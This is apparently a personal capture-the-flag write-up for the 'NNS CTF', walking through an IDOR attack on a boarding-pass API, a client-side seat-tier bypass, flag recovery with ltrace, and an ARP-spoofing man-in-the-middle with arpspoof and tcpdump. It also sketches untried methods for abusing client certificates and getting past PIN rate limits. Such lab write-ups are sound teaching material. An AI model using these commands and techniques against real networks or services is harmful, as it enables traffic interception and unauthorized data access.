# NNS CTF
## Overview
During this Capture The Flag (CTF) competition, I engaged with a diverse range of technical challenges spanning network exploitation, traffic analysis, public key infrastructure (PKI), and web application logic. My primary focus involved hands-on analysis of local container environments, where I successfully executed Man-in-the-Middle (MitM) positioning via ARP spoofing to intercept routed traffic and capture hidden flags. Beyond network exploitation, I systematically investigated complex security mechanisms across several other environments; ranging from dissecting client certificate authentication flows (mTLS) in Burp Suite and analyzing encrypted messaging protocols in packet captures to testing application rate-limiting enforcement and input validation logic. This write-up documents the methodologies, diagnostic steps, and technical findings across both fully solved challenges and ongoing research vectors.

---

## Web Hacker 2
### Challenge Overview
Web Hacker 2 was a classic example of how broken access controls can expose sensitive user data. The challenge started with a simple parameter tweak in the browser URL and ended with intercepting API traffic in Burp Suite to exfiltrate administrative data.

### Technical Walkthrough
1. **IDOR / BOLA via URL Manipulation**: While browsing the web application, the initial URL displayed a user ID parameter (e.g., `?id=1`). By manually incrementing that parameter to `?id=2` directly in the browser address bar, the application loaded a boarding pass page belonging to a user named John.

2. **Inspecting API Traffic in Burp Suite**: To see how the front end was pulling John's details, I captured the traffic and sent the request over to Burp Suite Repeater. Looking at the HTTP request headers and endpoint structure, I identified an underlying API call fetching the data:

```http
GET /api/boarding-pass/john HTTP/1.1
Host: challenge.target
User-Agent: Mozilla/5.0
Accept: application/json
```

The response returned a JSON object containing John's personal details and boarding pass information.

3. **Exploiting the Endpoint for Admin Data**: Since the API endpoint used a predictable resource identifier (`/john`) without validating session permissions, I edited the request in Burp Repeater to target the administrator profile instead:

```http
GET /api/boarding-pass/admin HTTP/1.1
Host: challenge.target
User-Agent: Mozilla/5.0
Accept: application/json
```

Sending this modified request bypassed the front-end interface entirely. The server responded with the full administrator record, which included the flag right at the top of the response body.

### Vulnerability Analysis
This attack succeeded due to two primary security failures working together:
* **Insecure Direct Object References (IDOR)/Broken Object Level Authorization (BOLA)**: The application relies on client-supplied input (`id=2` or `/admin`) to decide which record to retrieve from the database. It fails to verify whether the currently logged-in user actually has permission to view that specific record.
* **Lack of Server-Side Access Control on API Endpoints**: Even if the user interface hides links to admin pages, the backend API endpoint (`/api/boarding-pass/{username}`) was completely exposed. The server trusted the incoming request path implicitly rather than checking session state and user roles.

### Real-World Impact
BOLA and IDOR bugs are among the most common and dangerous vulnerabilities in modern web applications and microservices.
* **Mass Data Exfiltration**: Attackers don't just stop at one record. Once a predictable pattern like `/john` or `id=2` is found, an attacker can write a simple script to enumerate every user ID in the system, dumping thousands of customer records, PII, or financial documents in minutes.
* **Privilege Escalation & Account Takeover**: Accessing admin endpoints often leaks internal system configurations, API keys, or session tokens. In an enterprise environment, this level of exposure can turn a read-only data leak into full system compromise.

---

## Simon
### Challenge Overview
Simon presented a web-based seat reservation interface where specific high-tier seats were restricted to premium users. While standard seats could be selected and saved without issue, premium seats (like seat 3B) had their save buttons disabled in the user interface. By inspecting the page source code and modifying the client-side properties of the restricted seat, I bypassed the front-end restriction entirely and successfully booked the premium seat to capture the flag.

### Technical Walkthrough
1. **Identifying the Client-Side Restriction**: When attempting to select seat 3B, the interface visually acknowledged the click, but the Save button remained darkened and unclickable. Inspecting the lower, standard seats confirmed that they were fully interactive and allowed instant booking.

2. **Inspecting the DOM Element**: Right-clicking seat 3B and opening the browser developer tools revealed the HTML structure powering the button state:

```html
<button type="button" 
        class="seat seat--premium" 
        data-seat="3B" 
        data-status="premium" 
        aria-label="Seat 3B, premium" 
        aria-pressed="false">
  <span class="seat-back" aria-hidden="true"></span>
  <span class="seat-cushion" aria-hidden="true"></span>
</button>

```

The application was relying on the `data-status="premium"` attribute and the `seat--premium` class to enforce selection logic and keep the Save button disabled on the client side.

3. **Client-Side Source Modification & Exploitation**: Since the server failed to validate seat tier permissions upon submission, I edited the element attributes directly inside the Elements tab of DevTools:
  1. Changed `data-status="premium"` to `data-status="available"`.
  2. Selected seat 3B on the interactive map.

The front-end script immediately treated 3B as a valid standard seat, enabling the Save button. Submitting the form sent the modified seat choice to the backend, which accepted the request without verification and returned the flag.

### Vulnerability Analysis
This flaw is a textbook example of **Insufficient Server-Side Validation** combined with **Client-Side Security Enforcements**:
* **Trusting Client-Side State**: The web application assumes that whatever rules or restrictions are written into HTML attributes, JavaScript logic, or CSS classes will be respected. Client-side code runs entirely in the user's browser, which means the user has full control to edit, strip, or bypass any restriction before sending data back to the server.
* **Missing Authorization Logic on Form Submission**: The backend endpoint accepted the POST request containing `seat=3B` without checking whether the user session possessed a premium subscription tier to reserve that specific asset.

### Real-World Impact
While bypassing a seat selector on an airline app directly impacts revenue, relying on client-side controls causes severe security issues across many industries:
* **E-Commerce Price Manipulation**: Online storefronts that validate item prices or discount codes on the client side allow users to modify hidden form fields or request bodies (e.g., changing `price=199.99` to `price=0.01`) before hitting checkout, leading to significant financial loss.
* **Feature Authorization & Paywall Bypasses**: SaaS applications often use client-side flags to hide administrative buttons, premium analytics dashboards, or feature toggles. Users can flip those client-side flags in DevTools to unlock enterprise functionality without paying for higher tiers.
* **Banking & Financial Limit Overrides**: In web applications managing fund transfers or credit applications, client-side validation might attempt to block transfers over a certain threshold. Bypassing those front-end checks can allow unauthorized transfer amounts or unauthorized loan approvals if the server doesn't re-verify those boundaries.

---

# No Strings Attached
### Challenge Overview
No Strings Attached was a great reverse engineering challenge that showed why relying purely on static analysis tools like `strings` isn't always enough. The challenge provided a 64-bit Linux ELF binary that asked for a user guess. By stepping up from static checks to dynamic library tracing with `ltrace`, I exposed the full target flag directly in memory right as the binary evaluated my input.

### Technical Walkthrough
1. **Initial Static Analysis**: After downloading and extracting the ELF binary, the first instinct was to run standard static analysis:

```bash
file no-strings-attached
strings no-strings-attached
```

Running `strings` revealed typical ELF headers and basic system calls, but the flag itself was missing from the static binary string table. This indicated that the executable was either constructing the target string dynamically at runtime or decoding it in memory right before making the comparison.

2. **Basic Dynamic Tracing with ltrace**: Executing the binary normally just prompted for a guess and printed "rejected". To see what library calls were happening under the hood, I ran the binary under `ltrace` to intercept calls to C library functions like `strcmp`:

```bash
ltrace ./no-strings-attached
```

Passing a dummy input like `guess` produced the following output:

```text
write(1, "guess: ", 7)                                                 = 7
read(0, "guess\n", 127)                                                = 6
strcmp("guess", "NNS{n0_str1ngs_1n_7h3_b1n4ry_bu7"...)                  = 25
write(1, "rejected\n", 9)                                              = 9
+++ exited (status 2) +++
```

`ltrace` caught the binary decrypting the string on the fly and passing it straight to `strcmp()`. However, `ltrace` truncates string arguments by default, leaving off the last half of the flag.

3. **Adjusting String Length & Capturing the Flag**: To prevent argument truncation, I passed the `-s` flag to increase the maximum printed string length to 128 characters:

```bash
ltrace -s 128 ./no-strings-attached
```

Providing the input again revealed the full string comparison in cleartext:

```text
write(1, "guess: ", 7)                                                 = 7
read(0, "guess\n", 127)                                                = 6
strcmp("guess", "NNS{n0_str1ngs_1n_7h3_b1n4ry_bu7_ltr4c3_s4w_7h3_c0mp4r3}") = 25
write(1, "rejected\n", 9)                                              = 9
+++ exited (status 2) +++
```

The binary assembled the string dynamically, but passed it directly to standard GLIBC functions in plain text, making `ltrace` instantly solve it.


### Vulnerability Analysis & Real-World Impact
This challenge demonstrates two core concepts in reverse engineering and malware analysis: **Dynamic String Obfuscation** and **Library Call Interception**.
* **The Flaw of Insecure Runtime Comparisons**: The developers attempted basic obfuscation by making sure the flag wouldn't show up during a simple `strings` scan. However, hiding a secret in binary code without proper anti-debugging or custom comparison logic is just security through obscurity. At some point, the CPU has to hold the unencrypted string in memory to check if it matches user input.
* **Why ltrace Works**: `ltrace` intercepts dynamic library calls by hooking into the Procedure Linkage Table (PLT). When a program calls an external shared library function like `strcmp()`, `ltrace` places breakpoints at those PLT entries to inspect the arguments passed in registers or on the stack before letting the call finish.


### Real-World Applications outside CTFs
Dynamic tracing with tools like `ltrace`, `strace`, and `gdb` is a core skill for both offensive research and defensive incident response:
* **Malware Triage & De-obfuscation**: Modern malware routinely uses XOR encoding, custom packing, or API hashing to hide command and control (C2) domains, registry keys, and payload drops from static anti-virus scanners. Threat analysts use dynamic tracing to watch the malware decode those strings right before making network calls or spawning sub-processes, saving hours of manual disassembling.
* **API Key & Secret Discovery in Legacy Software**: In security assessments, enterprise applications often rely on compiled binaries that communicate with legacy backend services. If an application decrypts database credentials or hardcoded API tokens in memory before submitting them over standard library network sockets, dynamic tracing can reveal those secrets without needing the original source code.
* **Software Troubleshooting & Reverse Engineering Interoperability**: On the system administration side, `ltrace` and `strace` are invaluable for debugging closed-source software when configuration documentation is missing. Tracing system and library calls allows engineers to see exactly which shared libraries fail to load or which files a binary is attempting to read at runtime.

---

## Hiding in your WiFi
### Challenge Overview
* **Category:** Network Security / Man-in-the-Middle
* **Target Subnet:** `10.10.10.0/24` (VXLAN Overlay)
* **Objective:** Intercept and retrieve the HTTP response containing the flag passing between the victim (`10.10.10.20`) and the web server (`10.10.10.10`).


### Phase 1: Initial Access & Environment Discovery
Access to the container environment was established via SSL connection using `ncat`:

```bash
ncat --ssl hiding-in-your-wifi-1d15cd7b3765.chall.nnsc.tf 1337
```

Upon landing in the environment, listing the root directory contents revealed an initialization script, `entrypoint.sh`:

```bash
ls -la
cat entrypoint.sh
```

#### Script Inspection
Analyzing `entrypoint.sh` revealed key details about the underlying network topology and container setup:
* **Network Topology:** A VXLAN overlay (`vxlan0` / ID 42) creates a virtual `10.10.10.0/24` network containing three static hosts:
  * `server`: `10.10.10.10` (`02:00:00:00:00:10`)
  * `victim`: `10.10.10.20` (`02:00:00:00:00:20`)
  * `attacker`: `10.10.10.66` (`02:00:00:00:00:66`)
* **Automated Behavior:**
  * `server` runs an `nginx` web daemon hosting `/flag.txt`.
  * `victim` executes a loop every 5 seconds requesting `[http://10.10.10.10/flag.txt](http://10.10.10.10/flag.txt)` via `curl`.
  * `attacker` configures IP forwarding (`ip_forward = 1`) and disables ICMP redirects (`send_redirects = 0`).


### Phase 2: Role Testing & Network Verification
To test if the entrypoint script could be executed manually to reset or reconfigure interfaces, various role flags were passed to `entrypoint.sh`:

```bash
# Test attacker role setup
bash entrypoint.sh attacker

```

*Result:* Failed with `mount --make-shared /run/netns failed: Operation not permitted` due to unprivileged container security constraints.

```bash
# Test victim and server roles
bash entrypoint.sh victim
bash entrypoint.sh server
```

*Result*: Failed with `RTNETLINK answers: File exists`. This confirmed that the network namespaces, bridge FDB entries, and VXLAN interfaces were already initialized and actively running in the background.

Direct interaction with the web server from the attacker node returned no data, as the attacker host was not on the direct communication path:

```bash
curl -s -o /dev/null http://10.10.10.10/flag.txt
```

### Phase 3: Traffic Analysis & Attack Execution
To observe existing traffic on the base network interface, `tcpdump` was initialized:

```bash
tcpdump
```

*Output*: Captured active ARP traffic on `eth0`, confirming network activity.

A focused capture was then executed on port 80 to observe HTTP requests originating from the victim:

```bash
tcpdump -i eth0 -A -s 0 'tcp port 80'
```

*Output*: Confirmed that `10.10.10.20` (victim) was issuing periodic `GET /flag.txt HTTP/1.1` requests to `10.10.10.10` (server). However, because the environment simulates a switched network layer, response packets were not being routed through the attacker's interface.


#### Executing ARP Poisoning (MitM)
To force traffic between the victim and server to route through the attacker host (`10.10.10.66`), ARP spoofing was initiated using `arpspoof` in the background:

```bash
arpspoof -i eth0 -t 10.10.10.20 10.10.10.10 >/dev/null 2>&1 &
```

With ARP cache poisoning active and kernel IP forwarding enabled by default on the attacker node, traffic between `10.10.10.20` and `10.10.10.10` was successfully redirected through `eth0`.


### Phase 4: Payload Capture & Flag Extraction
A targeted packet capture was executed to display HTTP payload data:

```bash
tcpdump -i eth0 -A -s 0 'tcp port 80 and (((ip[20:2] - ((ip[0]&0xf)<<2)) - ((tcp[12:1]&0xf0)>>2)) > 0)'
```

 
#### Captured HTTP Response Stream

```http
00:24:18.561657 IP 10.10.10.10.80 > 10.10.10.20.46824: Flags [P.], seq 1:299, ack 84, win 487, options [nop,nop,TS val 3583334305 ecr 1213287579], length 298: HTTP: HTTP/1.1 200 OK
HTTP/1.1 200 OK
Server: nginx
Date: Mon, 07 Sep 2026 00:24:18 GMT
Content-Type: text/plain
Content-Length: 68
Last-Modified: Sun, 06 Sep 2026 23:50:04 GMT
Connection: keep-alive
ETag: "6a9dfc2c-44"
Accept-Ranges: bytes

NNS{5witcHeD_n37works_st111_7RUst_aRP_50_keep_Y0uR_d3V1c3s_sePaRa73}
```


### Key Takeaways
1. **Switched Virtual Networks & ARP:** Even in virtualized or VXLAN-based networks, Layer 2 protocols behave like traditional local networks. Without static ARP entries or dynamic ARP inspection (DAI), hosts trust incoming ARP replies.
2. **Man-in-the-Middle (MitM):** By poisoning the ARP cache of `10.10.10.20` to associate `10.10.10.10` with the attacker's MAC address, all HTTP traffic was routed through the attacker node, permitting cleartext packet inspection and flag extraction.

---

## Unfinished Challenges & Additional Technical Research
This section documents ongoing analysis, methodology testing, and research conducted across additional CTF challenges. While final flag extraction was not achieved during the competition window, the underlying mechanics, traffic analysis, and application testing protocols were thoroughly documented for further review.


### Challenge 1: Web Ass (Identity & Certificate Authority Abuse)
* **Core Focus:** Public Key Infrastructure (PKI), TLS Client Certificates, Authorization Bypass
* **Primary Tools:** Burp Suite Repeater, OpenSSL

#### **Technical Approach:**
The target application relied on Client Certificate Authentication (mTLS) to identify and authorize connected users. The primary goal was to manipulate certificate parameters and evaluate potential misconfigurations in how the backend Certificate Authority (CA) and reverse proxy validated identity claims.
* **Certificate Structure Analysis:** Evaluated the baseline client certificate and private key assigned to the session. Inspected the Subject Alternative Names (SAN), Common Name (CN) attributes, and issuer signatures to identify how user identities were mapped to session privileges.
* **Request Tampering & Header Injections:** Intercepted traffic and used proxy repeating tools to test edge cases in client certificate validation:
  * Removed client certificates entirely from requests to observe whether the backend enforced certificate presence or defaulted to anonymous fallback access.
  * Generated custom self-signed test certificates using external key generation utilities to determine if the backend verified the full trust chain against a specific internal Root CA or blindly accepted any validly formatted certificate.
  * Tested reverse proxy header overrides (such as client certificate DN and forwarding headers) to evaluate whether the application trusted header values passed directly from the client layer.


#### **Takeaways & Next Steps:**
Future analysis involves testing for null byte injection within the Subject CN field and auditing whether the CA permits arbitrary certificate signing via exposed enrollment endpoints or administrative interfaces.


### Challenge 2: Min Beste Venn (Network Forensics & Covert Channels)
* **Core Focus:** PCAP Analysis, Custom Protocol Deobfuscation, Traffic Reconstruction
* **Primary Tools:** Wireshark, TShark, NetworkMiner, Python

#### **Technical Approach:**
The objective was to analyze a provided packet capture file containing network activity from a host running a proprietary, non-standard messaging application.
* **Traffic Isolation & Filtering:** Analyzed TCP and UDP endpoints to filter out standard background protocol noise (such as DNS, TLS, and HTTP traffic). Identified recurring connections between specific internal and external IP addresses that corresponded to active session windows.
* **Custom Messaging Protocol Deconstruction:**
  * Isolated individual TCP streams associated with the messaging application to map out session establish mechanics and message transmission boundaries.
  * Extracted raw byte payloads across sequential packets to search for repeating headers, magic bytes, or static delimiters that defined packet structures.
  * Calculated payload entropy across message bodies to determine if transmitted data was encrypted, compressed, or transformed using simple encoding techniques like XOR or Base64.


#### **Takeaways & Next Steps:**
The custom application traffic exhibited high entropy, indicating stream-level encryption or compression. The next phase requires reverse engineering the client application binary to analyze its cryptographic routines and identify static keying material or initialization vectors embedded in the executable.


### Challenge 3: NNS Travel (Application Logic & PIN Brute-Force Rate Limiting)
* **Core Focus:** Business Logic Abuse, Rate-Limiting Bypass, Parameter Fuzzing
* **Primary Tools:** Burp Suite Intruder, Python

#### **Technical Approach:**
The application featured a verification interface protected by a six-digit numeric PIN code. The investigation focused on identifying weaknesses in state management, rate-limiting enforcement, or logic validation to bypass or recover the required access code.
* **Baseline Request & Response Mapping:** Captured baseline verification attempts to analyze data formatting, cookie management, session state markers, and the specific error messages returned upon submitting incorrect attempts.
* **Rate-Limiting & Validation Testing:** Executed multiple testing methodologies to determine how the server tracked and enforced attempt limits:
  * Rotated client identification headers (such as forwarded-for and client IP headers) across repeated validation requests to test whether rate limits were tied to IP address attributes or session tokens.
  * Tested type confusion and structured payload variations (such as submitting arrays or integer structures instead of raw string inputs) to see how the backend JSON parser processed unexpected formats.
  * Evaluated concurrency handling by sending simultaneous verification requests in parallel batches to check for race conditions in the attempt counter mechanism.


#### **Takeaways & Next Steps:**
Linear attempt automation was restricted by session-level lockout logic. Next steps involve analyzing authorization flaws in secondary endpoints to determine if authentication can be bypassed entirely or if session validation states can be manipulated client-side.
